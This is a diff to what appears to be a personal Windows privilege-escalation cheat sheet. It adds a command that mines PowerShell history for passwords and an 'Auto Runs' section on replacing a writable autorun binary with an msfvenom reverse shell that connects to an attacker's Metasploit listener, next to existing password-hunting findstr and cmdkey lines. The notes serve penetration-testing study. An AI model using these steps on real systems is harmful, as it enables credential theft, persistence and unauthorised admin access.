@@ -24,7 +24,8 @@ Get-ChildItem C:\Users -Force | select Name
 net share
 powershell Find-DomainShare -ComputerDomain domain.local
 
-<h3>Find passwords</h3>
+<h3>Find passwords</h3> <br>
+Powershell cred history - cat (Get-PSReadlineOption).HistorySavePath | sls passw <br>
 cmdkey /list (need to the use windows tool - runas.exe google the syntax to see how to run this.<br>
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
@@ -114,6 +115,20 @@ you change change whats in the generated exe  <br>
 <br>
 <h2> RunAs </h2> <br>
 If you have a meterpreter shell, try the command getsystem <br>
+<br>
+
+<h2> Auto Runs (does require admin already for admin shell, can use to create meterpreter shell </h2>
+autorunsc.exe -m -nobanner -a * -ct /accepteula <br>
+Winpeas will also check <br>
+Download autorun to machine, Run on cmd -- C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe (change path to where installed) <br>
+Have a look what programs auto run and where they point too <br>
+Now download Accesschk on pc, navigate to via cmd <br>
+C:\Users\User\Desktop\path\to\accesschk64.exe -wvu "C:\Programs\path of program that autoruns" <br>
+see if everyone has access all rights <br>
+generate new reverse shell with msfvenom linking listener to attacker IP<br>
+start new multi handler with metasploit and setup listner <br>
+Replace autorun file with malicious generated file <br>
+logout and back in <br>
 
 
 <h2>kernel exploits</h2>
